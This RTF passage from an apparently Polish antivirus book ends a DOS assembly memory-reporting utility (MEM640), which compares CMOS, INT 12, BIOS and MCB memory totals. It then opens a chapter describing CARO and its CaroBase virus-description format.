\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch UMB_NieDolaczone:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ah,52h                      ; funkcja DOS - wez adres listy list LL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,es:[bx-2]                ; wez adres pierwszego bloku MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NastepnyMCB:                             ; kolejne bloki MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cmp   ax,0A000h                   ; czy >640kB ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jae   Tylko640                    ; TAK - pomin}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   es,ax                       ; ES=MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        stc                               ; +1 w dodawaniu ponizej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        adc   ax,word ptr es:[3]          ; dodaj rozmiar bloku MCB+1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; AX=nastepny blok MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        cmp   byte ptr es:[0],'Z'         ; czy to ostatni blok MCB ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jne   NastepnyMCB                 ; NIE - dodaj koleny blok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; TAK - wyswietl sume}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tylko640:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   ax,cx                       ; dodaj ewentualny blok MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; opisujacy bloki MCB w pamieci UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; AX=pamiec w paragrafach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,16                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mul   bx                          ; / oblicz ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        call  DrukDec32                   ; wyswietl ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   bx                          ; przywroc info o UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bh,0                        ; BX=BL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5803h                    ; funkcja DOS - dolacz/odlacz bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   dx cx bx ax es              ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukDec32:                               ; wyswietl liczbe w DX:AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax bx dx si                 ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   si,offset Hex2DecBufor+10   ; ustaw na koniec bufora, bo zapis od konca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   byte ptr [si],0             ; utworz ASCIIZ dodaj zero na koncu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    DzielPrzez10:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,10                       ; dziel DX:AX przez BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Dziel32                     ; w BX reszta z dzielenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   bl,'0'                      ; dodaj ASCII "0"}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        dec   si                          ; zmniejsz index w tablicy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   byte ptr ds:[si],bl         ; zapisz cyfre}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    dx,dx                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   DzielPrzez10                ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    ax,ax                       ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   DzielPrzez10                ; --- czy liczba jest juz rowna 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; NIE - dziel dalej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        call  DrukLn                      ; TAK - wyswietl bufor}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   si dx bx ax                 ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dziel32:                                 ; dziel (DX:AX)/BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  bp                          ; zachowaj BP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax                          ; zachowac mniejsza czesc liczby 32 bitowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,dx                       ; przenies b. znacz. czesc do mniej. znacz.}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xor   dx,dx                       ; i wyzeruj DX, DX:AX = > 0:DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        div   bx                          ; podziel (0:DX)/BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bp,ax                       ; calosc z dzielenia to wieksza czesc wyniku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   ax                          ; przywroc do AX mniej znaczaca liczbe z poczatku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        div   bx                          ; DX jest reszta z dzielenia b. znacz. czesci przez BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,dx                       ; w BX reszta z dzielenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   dx,bp                       ; DX:AX=liczba podzielona przez BX,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; a w BX reszta z dzielenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   bp                          ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukLn:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  si                          ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        call  Druk                        ; wyswietl tekst z CS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeCRLF                   ; \\ i przejdz do nastepnej linii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   si                          ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax si                       ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPetla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lods  byte ptr cs:[si]            ; wez kolejny znak tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    al,al                       ; czy NUL ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jz    DrukPowrot                  ; TAK - koniec tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ah,0Eh                      ; funkcja BIOS - wyswietl znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   10h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jmp   short DrukPetla             ; pobierz kolejny znak tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop  si ax                        ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeCopyRight db CR,LF,'MEM640 v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch               db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch               db CR,LF,'Wielkosc pamieci w bajtach :',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       TeCMOS  db ' _ CMOS                     : ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       TeInt12 db ' _ INT 12                   : ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeZmiennaBIOS db ' _ Zmienna BIOS 0000:0412   : ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         TeMCB db ' _ Suma blokow MCB (<640kB) : ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        TeCRLF db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Hex2DecBufor     db 11 dup(?)     ; bufor na liczbe dzisietna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PROG ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 13}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CARO (Computer Antyvirus Research Organization) jest organizacj\uc1\u261\'b9 zrzeszaj\uc1\u261\'b9c\uc1\u261\'b9 autor\'f3w program\'f3w antywirusowych z ca\uc1\u322\'b3ego \uc1\u347\'9cwiata. Jednym z zada\uc1\u324\'f1, kt\'f3re stawia sobie organizacja, jest ujednolicenie nazewnictwa oraz opisu istniej\uc1\u261\'b9cych wirus\'f3w. Dla w\uc1\u322\'b3asnych potrzeb organizacja stworzy\uc1\u322\'b3a co\uc1\u347\'9c w rodzaju specyfikacji opisu wirus\'f3w, zwanej CaroBase.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Plik w formacie CARO jest zwyk\uc1\u322\'b3ym plikiem tekstowym i zawiera nast\uc1\u281\'eapuj\uc1\u261\'b9ce pola i etykiety:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CAROBASE_BANNER: na pocz\uc1\u261\'b9tku pliku; zawiera in}{\f1\fs24\lang1045{\*\listtag0}formacje o autorze opracowania itd. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CAROBASE_LINGUA: okre\uc1\u347\'9cla j\uc1\u281\'eazyk, w kt\'f3rym napisany jest dokument; najcz\uc1\u281\'ea\uc1\u347\'9cciej jest to angielski (English).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CAROBASE_START: znacznik ko\uc1\u324\'f1ca CAROBASE BANNER, zaraz po tym polu rozpoczyna si\uc1\u281\'ea pierwszy rekord opisu (ka\uc1\u380\'bfdy re}{\f1\fs24\lang1045{\*\listtag0}kord opisuje jednego wirusa).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CAROBASE_END: ko\uc1\u324\'f1czy ostatni rekord opisu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Mo\uc1\u380\'bfliwe rekordy zawieraj\uc1\u261\'b9ce opis to:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NAME: nazwa w standardzie CARO.}{\f1\fs24\lang1045{\*\listtag0}\par}
